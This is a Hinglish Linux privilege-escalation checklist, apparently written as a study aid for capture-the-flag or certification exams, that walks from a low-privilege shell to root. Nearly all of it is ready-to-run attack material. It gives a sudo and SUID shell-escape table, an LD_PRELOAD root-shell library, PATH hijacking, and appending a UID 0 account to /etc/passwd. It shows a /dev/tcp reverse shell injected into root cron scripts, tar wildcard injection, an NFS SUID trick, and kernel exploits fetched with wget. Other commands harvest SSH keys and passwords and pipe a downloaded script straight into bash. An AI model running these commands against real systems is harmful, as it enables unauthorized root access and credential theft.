# LINUX PRIVILEGE ESCALATION CHECKLIST — User Se Root Tak

---

## Ye Kya Hai?
Tujhe Linux pe low-privilege shell mila (www-data, user, etc.) — ab root banana hai.
Privilege Escalation (privesc) matlab apni permissions badhana. Ye checklist ORDER mein hai —
easy se hard, pehle wale try karo, agar nahi chale toh next pe jaao.

**Golden Rule:** `sudo -l` SABSE PEHLE, kernel exploit SABSE LAST mein.

---

## CHECK 1: sudo -l (SABSE PEHLE YE KARO — 90% Cases Yahi Solve Karta Hai)

```bash
sudo -l
```
**Ye kya karta hai:** Batata hai ki current user kaunse commands sudo (root) permissions se
chala sakta hai bina password ke.

### Output Samjho:
```
User www-data may run the following commands on target:
    (ALL) NOPASSWD: /usr/bin/vi
```
Matlab: `vi` command ko sudo se bina password ke root jaisa chala sakta hai.

### GTFOBins Kya Hai?
gtfobins.github.io ek website hai jahan EVERY Linux binary ke liye sudo/SUID exploit
milta hai. Binary name search karo → sudo section dekho → command copy karo → root!

### Common sudo Binaries Aur Unke Exploits:

| sudo Output Mein Ye Dikhe | Ye Command Run Karo | Kyu Kaam Karta Hai |
|---|---|---|
| `(ALL) NOPASSWD: ALL` | `sudo su` ya `sudo bash` | Kuch bhi root se chala sakta hai! |
| `NOPASSWD: /usr/bin/vi` | `sudo vi -c ':!bash'` | vi ke andar se bash spawn hota hai |
| `NOPASSWD: /usr/bin/vim` | `sudo vim -c ':!bash'` | Same as vi |
| `NOPASSWD: /usr/bin/nano` | `sudo nano /etc/passwd` → edit | Root file edit kar sakta hai |
| `NOPASSWD: /usr/bin/python` | `sudo python -c 'import os;os.system("/bin/bash")'` | Python se bash spawn |
| `NOPASSWD: /usr/bin/python3` | `sudo python3 -c 'import os;os.system("/bin/bash")'` | Same for python3 |
| `NOPASSWD: /usr/bin/find` | `sudo find / -exec /bin/bash \;` | find ka -exec flag command execute karta hai |
| `NOPASSWD: /usr/bin/awk` | `sudo awk 'BEGIN{system("/bin/bash")}'` | awk se system command execute |
| `NOPASSWD: /usr/bin/less` | `sudo less /etc/passwd` phir `!bash` | less ke andar `!` se command chalti hai |
| `NOPASSWD: /usr/bin/more` | `sudo more /etc/passwd` phir `!bash` | Same as less |
| `NOPASSWD: /usr/bin/man` | `sudo man man` phir `!bash` | man pages bhi shell dete hain |
| `NOPASSWD: /usr/bin/nmap` | `sudo nmap --interactive` phir `!sh` | Old nmap (2.02-5.21) mein interactive mode |
| `NOPASSWD: /usr/bin/perl` | `sudo perl -e 'exec "/bin/bash";'` | Perl se bash exec |
| `NOPASSWD: /usr/bin/ruby` | `sudo ruby -e 'exec "/bin/bash"'` | Ruby se bash exec |
| `NOPASSWD: /usr/bin/env` | `sudo env /bin/bash` | env direct command execute karta hai |
| `NOPASSWD: /usr/bin/wget` | Download /etc/shadow, crack offline | File overwrite bhi possible |
| `NOPASSWD: /usr/bin/cp` | `sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash` | SUID bash copy |
| `NOPASSWD: /usr/bin/zip` | `sudo zip /tmp/x.zip /etc/passwd -T --unzip-command="bash -c '/bin/bash'"` | zip ke test flag se |
| `NOPASSWD: /usr/bin/tar` | `sudo tar cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash` | tar checkpoint action |
| `NOPASSWD: /usr/bin/tee` | `echo 'hacker::0:0::/root:/bin/bash' \| sudo tee -a /etc/passwd` | File mein append |

**Koi aur binary dikhe?** → gtfobins.github.io pe jaake search karo!

### LD_PRELOAD Trick (Rare but Powerful):
Agar `sudo -l` mein `env_keep+=LD_PRELOAD` dikhe:
```c
// shell.c banao:
#include <stdio.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0); setuid(0);
    system("/bin/bash");
}
```
```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
sudo LD_PRELOAD=/tmp/shell.so <any_allowed_command>
# Root!
```

---

## CHECK 2: SUID Binaries

```bash
find / -perm -4000 -type f 2>/dev/null
# Ya:
find / -perm -u=s -type f 2>/dev/null
```

### SUID Kya Hai — Detail Mein:
Normal mein jab tu koi program chalata hai, wo TERI permissions se chalta hai. Lekin agar
kisi binary pe SUID bit set hai, wo binary apne OWNER ki permissions se chalta hai.
Agar owner root hai → binary root jaisa chalta hai → shell escape = root shell!

### Output Example:
```
/usr/bin/passwd                     ← Normal SUID (ye exploit nahi)
/usr/bin/sudo                       ← Normal
/usr/bin/find                       ← EXPLOIT possible!
/usr/bin/vim                        ← EXPLOIT possible!
/usr/bin/python                     ← EXPLOIT possible!
/usr/bin/nmap                       ← EXPLOIT possible!
/usr/local/bin/custom_binary        ← INTERESTING — custom binary!
```

### SUID Exploit Examples:
```bash
# find with SUID:
find . -exec /bin/bash -p \;
# -p flag IMPORTANT — bash ko effective UID (root) drop nahi karne deta

# vim with SUID:
vim -c ':!bash -p'

# python with SUID:
python -c 'import os; os.execl("/bin/bash", "bash", "-p")'

# nmap (old versions 2.02-5.21) with SUID:
nmap --interactive
!sh

# cp with SUID:
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
/tmp/rootbash -p
```

**Custom/Unknown SUID binary?**
```bash
strings /usr/local/bin/custom_binary
# Kya ye koi doosra command call karta hai bina full path ke?
# Example: ye "cat" call karta hai as "cat" not "/bin/cat"
# Toh PATH manipulation karo!
export PATH=/tmp:$PATH
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
/usr/local/bin/custom_binary        # Ab tera "cat" chalega = root bash!
```

---

## CHECK 3: Writable /etc/passwd

```bash
ls -la /etc/passwd
```
Agar writable hai (`-rw-rw-rw-` ya tere group ko write access):
```bash
# Password hash generate karo:
openssl passwd -1 pass123
# Output: $1$xyz$abc...

# New root user add karo:
echo 'hacker:$1$xyz$abc...:0:0:root:/root:/bin/bash' >> /etc/passwd

# Switch:
su hacker
# Password: pass123
# whoami → root!
```
**Kyu kaam karta hai:** /etc/passwd mein UID 0 wala user root jaisa treat hota hai

---

## CHECK 4: Cron Jobs

```bash
cat /etc/crontab                    # System cron jobs
ls -la /etc/cron.d/                 # Cron directory
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
crontab -l                          # Current user ke cron
```

### Cron Kya Hai:
Scheduled tasks jo automatically chalte hain. Format:
```
* * * * * root /path/to/script.sh
│ │ │ │ │
│ │ │ │ └── Day of week (0-7)
│ │ │ └──── Month (1-12)
│ │ └────── Day of month (1-31)
│ └──────── Hour (0-23)
└────────── Minute (0-59)
```

### Exploit Kaise:
1. Cron job dhundho jo **root** se chal raha hai
2. Check karo script **writable** hai ya nahi: `ls -la /path/to/script.sh`
3. Writable hai? Reverse shell inject karo!

```bash
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' >> /path/to/cron_script.sh
# Apni machine pe listener:
nc -lvnp 4444
# Jab cron next time chalega → root reverse shell milegi!
```

### Wildcard Injection (tar cron mein):
Agar cron mein `tar cf backup.tar *` hai writable directory mein:
```bash
echo '' > '/path/--checkpoint=1'
echo '' > '/path/--checkpoint-action=exec=bash shell.sh'
echo 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1' > /path/shell.sh
# Jab tar chalega → `*` wildcard in filenames ko flags samjhega → shell!
```

---

## CHECK 5: NFS no_root_squash

```bash
# Target pe:
cat /etc/exports

# Apni machine se:
showmount -e <TARGET_IP>
```

### no_root_squash Kya Hai — Poora Mechanism:
1. NFS (Network File System) allows remote file sharing
2. Normally jab tu as root NFS mount karta hai, server tera root access hata ke "nobody" bana deta hai (root_squash)
3. `no_root_squash` mein ye protection DISABLE hai
4. Toh tu apni machine pe as root SUID binary bana sakta hai
5. Target pe mount ho rahi hai → target pe execute → ROOT!

### Exploit Steps:
```bash
# Apni machine pe (as root):
mkdir /tmp/nfs_mount
mount -o rw,vers=3 <TARGET_IP>:/shared_path /tmp/nfs_mount

# SUID bash copy:
cp /bin/bash /tmp/nfs_mount/rootbash
chmod +s /tmp/nfs_mount/rootbash

# Target pe:
/shared_path/rootbash -p
# Root shell!
```

### Alternative — C program:
```c
// shell.c
#include <stdio.h>
#include <unistd.h>
int main() {
    setuid(0); setgid(0);
    system("/bin/bash -p");
    return 0;
}
```
```bash
# Apni machine pe:
gcc shell.c -o /tmp/nfs_mount/shell
chmod +s /tmp/nfs_mount/shell
# Target pe: /shared_path/shell → ROOT!
```

---

## CHECK 6: Kernel Exploits (LAST RESORT)

```bash
uname -r                            # Kernel version
uname -a                            # Full system info
cat /etc/issue                      # OS version
cat /etc/*release*                  # Detailed OS info
```

### Common Kernel Exploits:

| Kernel | Exploit Name | CVE | Notes |
|---|---|---|---|
| < 3.9 | DirtyCow | CVE-2016-5195 | Race condition in memory management |
| < 5.8 | PwnKit | CVE-2021-4034 | pkexec vulnerability, very reliable |
| < 5.8 | DirtyPipe | CVE-2022-0847 | Pipe buffer flag manipulation |
| < 3.19 | Overlayfs | CVE-2015-1328 | Ubuntu specific |

```bash
# Exploit search:
searchsploit linux kernel <VERSION>
searchsploit linux kernel <VERSION> privilege escalation

# PwnKit (sabse easy):
# Download: https://github.com/ly4k/PwnKit
# Upload to target:
wget http://YOUR_IP:8888/PwnKit
chmod +x PwnKit
./PwnKit
# Root!
```

**IMPORTANT: Kernel exploit kyu last resort hai?**
- System crash ho sakta hai (exam mein machine restart = time waste)
- Compiled binary architecture match hona chahiye (32-bit vs 64-bit)
- Pehle easy methods try karo — sudo, SUID, cron almost always kaam karte hain

---

## CHECK 7: Sensitive Files Dhundho

```bash
# Backup files (passwords hote hain):
find / -name "*.bak" -o -name "*.old" -o -name "*.conf" -o -name "*.config" 2>/dev/null

# Bash history (previous commands mein passwords):
cat /home/*/.bash_history
cat /root/.bash_history 2>/dev/null

# SSH keys:
find / -name "id_rsa" -o -name "authorized_keys" 2>/dev/null
cat /home/*/.ssh/id_rsa

# Config files mein passwords:
cat /var/www/html/config.php
cat /var/www/html/wp-config.php
find / -name "wp-config.php" 2>/dev/null
grep -r "password" /var/www/ 2>/dev/null
grep -r "password" /etc/ 2>/dev/null

# Writable files:
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

---

## CHECK 8: LinPEAS — Automated Scanner (Sab Ek Saath)

```bash
# Apni machine pe HTTP server:
python3 -m http.server 8888

# Target pe download aur run:
wget http://YOUR_IP:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh

# Agar wget nahi hai:
curl http://YOUR_IP:8888/linpeas.sh | bash

# Agar curl bhi nahi:
# Netcat se transfer:
# Apni machine: nc -lvnp 9999 < linpeas.sh
# Target: nc YOUR_IP 9999 > linpeas.sh
```

### LinPEAS Output Samjho:
- **RED/YELLOW text** = High priority, exploit ho sakta hai
- **RED** = 95% chance exploit possible
- Pehle RED items dekho, phir YELLOW
- Sab manual checks ye automatically karta hai

---

## Common Mistakes (Mat Karna Ye)

1. **sudo -l skip karna** — Ye 90% time kaam karta hai, PEHLE karo
2. **`-p` flag bhoolna bash mein** — SUID exploit mein `/bin/bash -p` zaroori hai, nahi toh effective UID drop ho jaata hai
3. **GTFOBins nahi check karna** — Unknown binary dikhe toh pehle yahan search karo
4. **Kernel exploit pehle try karna** — System crash = time waste, easy methods pehle
5. **`2>/dev/null` nahi lagana** — Permission denied errors se output unreadable hota hai
6. **LinPEAS output rush mein padhna** — Pehle RED items pe focus karo
7. **Cron job timing nahi samajhna** — `* * * * *` = har minute, injection ke baad wait karo
8. **NFS mount mein SUID bit nahi set karna** — `chmod +s` bhoolna = exploit fail

---

## Quick Decision Tree

```
Low-privilege shell mili (www-data, user, etc.)
  |
  1. sudo -l
  |   +-- Something found? --> GTFOBins se exploit
  |   +-- (ALL) NOPASSWD: ALL? --> sudo su --> ROOT!
  |
  2. find / -perm -4000 2>/dev/null
  |   +-- Interesting SUID? --> GTFOBins SUID section
  |   +-- Custom binary? --> strings + PATH manipulation
  |
  3. ls -la /etc/passwd
  |   +-- Writable? --> Add root user
  |
  4. cat /etc/crontab
  |   +-- Root cron + writable script? --> Inject reverse shell
  |
  5. cat /etc/exports
  |   +-- no_root_squash? --> Mount + SUID binary trick
  |
  6. Sensitive files search
  |   +-- SSH keys? --> ssh -i key user@localhost
  |   +-- Config passwords? --> su / ssh with found creds
  |
  7. uname -r
  |   +-- Old kernel? --> searchsploit → kernel exploit
  |
  8. LinPEAS chala do (sab check ek saath)
  |
  +-- ROOT MILA --> cat /root/flag.txt
```
